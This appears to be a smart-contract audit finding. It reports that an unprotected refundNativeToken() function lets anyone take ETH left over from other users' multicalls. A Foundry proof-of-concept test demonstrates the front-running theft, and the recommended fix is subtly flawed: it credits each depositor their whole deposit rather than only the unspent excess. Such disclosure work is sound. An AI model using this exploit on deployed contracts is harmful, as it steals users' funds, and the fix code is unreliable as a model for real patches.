## Title
Leftover ETH in PayableMulticallable Contracts Can Be Stolen via Unprotected refundNativeToken()

## Summary
The `refundNativeToken()` function in `PayableMulticallable` sends all remaining ETH balance to `msg.sender` without verifying that `msg.sender` was the original depositor. When users send excess ETH via multicall on Router, Orders, or BasePositions, any attacker can front-run and steal the leftover ETH by calling `refundNativeToken()` before the original user can claim it.

## Impact
**Severity**: Medium

## Finding Description
**Location:** [1](#0-0) 

**Intended Logic:** The `refundNativeToken()` function is designed to allow users to recover ETH that was sent for transient payments but not fully consumed during multicall operations.

**Actual Logic:** The function sends the entire contract balance to `msg.sender` without any access control or tracking of who deposited the ETH. This creates a vulnerability where leftover ETH from one user's transaction can be stolen by another user who calls `refundNativeToken()` first.

**Exploitation Path:**

1. **Alice calls multicall with excess ETH**: Alice calls `BasePositions.multicall{value: 2 ETH}([deposit1, deposit2])` where deposit1 needs 0.8 ETH and deposit2 needs 0.7 ETH.

2. **ETH remains in contract**: After both deposits complete, they each call [2](#0-1)  which sends only the required amount to Core. Total used: 1.5 ETH, leaving 0.5 ETH in BasePositions contract.

3. **Bob frontruns the refund**: Before Alice can call `refundNativeToken()` in a subsequent transaction, Bob monitors the mempool and front-runs with his own call to `BasePositions.refundNativeToken()`.

4. **Bob receives Alice's ETH**: The function executes [3](#0-2)  sending all 0.5 ETH to Bob (`msg.sender`), not Alice who deposited it.

**Security Property Broken:** Users' funds can be stolen through front-running, violating the principle that user deposits should only be withdrawable by the depositor.

## Impact Explanation
- **Affected Assets**: Native ETH sent with multicall transactions to Router, Orders, or BasePositions contracts
- **Damage Severity**: Any user who sends more ETH than required for their multicall operations risks losing the excess to front-runners. The amount varies but could be substantial if users send safety margins or if gas estimation is imprecise.
- **User Impact**: All users of BasePositions and Orders multicall functions with ETH are affected. Users who don't include `refundNativeToken()` in their multicall batch or who attempt to call it in a separate transaction are vulnerable to theft.

## Likelihood Explanation
- **Attacker Profile**: Any external observer monitoring the mempool can exploit this. No special privileges required.
- **Preconditions**: 
  - A user must call multicall with excess ETH on Router, Orders, or BasePositions
  - The user must not include `refundNativeToken()` in the same multicall batch
  - There must be a time window between the multicall transaction and any refund attempt
- **Execution Complexity**: Simple single-transaction front-run attack. Attacker monitors for transactions that leave ETH balance in these contracts and immediately calls `refundNativeToken()`.
- **Frequency**: Can occur on every transaction where users send excess ETH. Given that exact ETH calculation is difficult (slippage, gas variations), this is likely to happen regularly.

## Recommendation

The `refundNativeToken()` function should track who deposited ETH and only allow that address to claim refunds. Here's the recommended fix:

```solidity
// In src/base/PayableMulticallable.sol:

// Add state variable to track depositor per transaction
mapping(address => uint256) private _depositorBalance;

// Modify multicall to track deposits
function multicall(bytes[] calldata data) public payable override returns (bytes[] memory) {
    if (msg.value > 0) {
        _depositorBalance[msg.sender] += msg.value;
    }
    _multicallDirectReturn(_multicall(data));
}

// CURRENT (vulnerable):
function refundNativeToken() external payable {
    if (address(this).balance != 0) {
        SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
    }
}

// FIXED:
function refundNativeToken() external payable {
    uint256 refundAmount = _depositorBalance[msg.sender];
    if (refundAmount > 0) {
        _depositorBalance[msg.sender] = 0;
        uint256 actualRefund = refundAmount > address(this).balance ? address(this).balance : refundAmount;
        SafeTransferLib.safeTransferETH(msg.sender, actualRefund);
    }
}
```

**Alternative mitigation:** Document that users MUST include `refundNativeToken()` as the last call in their multicall batch to atomically claim refunds, though this still requires user awareness and proper usage.

## Proof of Concept

```solidity
// File: test/Exploit_RefundNativeTokenTheft.t.sol
// Run with: forge test --match-test test_RefundNativeTokenTheft -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Positions.sol";
import "../src/Core.sol";
import {PoolKey} from "../src/types/poolKey.sol";
import {PoolConfig, createPoolConfig} from "../src/types/poolConfig.sol";
import {NATIVE_TOKEN_ADDRESS} from "../src/math/constants.sol";
import {TestToken} from "./TestToken.sol";

contract Exploit_RefundNativeTokenTheft is Test {
    Core core;
    Positions positions;
    TestToken token1;
    address alice = address(0x1111);
    address bob = address(0x2222);
    
    function setUp() public {
        // Deploy Core and Positions
        core = new Core();
        positions = new Positions(core, address(this));
        
        // Deploy token1
        token1 = new TestToken("Token1", "TK1", 18);
        
        // Fund Alice with ETH
        vm.deal(alice, 10 ether);
    }
    
    function test_RefundNativeTokenTheft() public {
        // SETUP: Alice prepares to deposit with excess ETH
        vm.startPrank(alice);
        
        // Create pool with ETH as token0
        PoolKey memory poolKey = PoolKey({
            token0: NATIVE_TOKEN_ADDRESS,
            token1: address(token1),
            config: createPoolConfig({
                _extension: address(0),
                _tickSpacing: 1,
                _fee: 0,
                _flags: 0
            })
        });
        
        // Initialize pool
        positions.maybeInitializePool(poolKey, 0);
        
        // Mint token1 for Alice
        token1.mint(alice, 10 ether);
        token1.approve(address(core), type(uint256).max);
        
        // Record Alice's initial balance
        uint256 aliceInitialBalance = alice.balance;
        
        // EXPLOIT SETUP: Alice calls multicall with 2 ETH but operation only needs 1.5 ETH
        // In a real scenario, this happens due to imprecise gas estimation or safety margins
        bytes[] memory calls = new bytes[](1);
        calls[0] = abi.encodeWithSelector(
            positions.mintAndDeposit.selector,
            poolKey,
            -100,
            100,
            1.5 ether, // maxAmount0
            1.5 ether, // maxAmount1  
            0
        );
        
        // Alice sends 2 ETH but only needs ~1.5 ETH
        positions.multicall{value: 2 ether}(calls);
        
        vm.stopPrank();
        
        // VERIFY: Some ETH remains in positions contract
        uint256 leftoverEth = address(positions).balance;
        assertGt(leftoverEth, 0, "ETH should remain in contract");
        console.log("Leftover ETH in Positions contract:", leftoverEth);
        
        // EXPLOIT: Bob front-runs Alice's refund call
        vm.prank(bob);
        positions.refundNativeToken();
        
        // VERIFY: Bob received Alice's leftover ETH
        assertEq(bob.balance, leftoverEth, "Bob stole Alice's leftover ETH");
        console.log("Bob's balance after theft:", bob.balance);
        
        // VERIFY: Alice lost her excess ETH
        assertLt(alice.balance, aliceInitialBalance - 1.5 ether, "Alice lost more ETH than used in position");
    }
}
```

**Notes:**
- This vulnerability affects all three contracts inheriting from PayableMulticallable: Router, Orders, and BasePositions
- Router has some internal refund logic for swaps [4](#0-3)  but this doesn't protect against the multicall-level excess ETH issue
- The warning in FlashAccountant about not being multicallable [5](#0-4)  is respected (Core doesn't inherit PayableMulticallable), so that specific concern doesn't materialize, but the PayableMulticallable pattern itself introduces the refund theft vulnerability

### Citations

**File:** src/base/PayableMulticallable.sol (L25-29)
```text
    function refundNativeToken() external payable {
        if (address(this).balance != 0) {
            SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
        }
    }
```

**File:** src/base/BasePositions.sol (L256-258)
```text
                if (amount0 != 0) {
                    SafeTransferLib.safeTransferETH(address(ACCOUNTANT), amount0);
                }
```

**File:** src/Router.sol (L134-146)
```text
                        if (poolKey.token0 == NATIVE_TOKEN_ADDRESS) {
                            int256 valueDifference = int256(value) - int256(balanceUpdate.delta0());

                            // refund the overpaid ETH to the swapper
                            if (valueDifference > 0) {
                                ACCOUNTANT.withdraw(NATIVE_TOKEN_ADDRESS, swapper, uint128(uint256(valueDifference)));
                            } else if (valueDifference < 0) {
                                SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint128(uint256(-valueDifference)));
                            }
                        } else {
                            ACCOUNTANT.payFrom(swapper, poolKey.token0, uint128(balanceUpdate.delta0()));
                        }
                    }
```

**File:** src/base/FlashAccountant.sol (L387-388)
```text
        // Note because we use msg.value here, this contract can never be multicallable, i.e. it should never expose the ability
        //      to delegatecall itself more than once in a single call
```
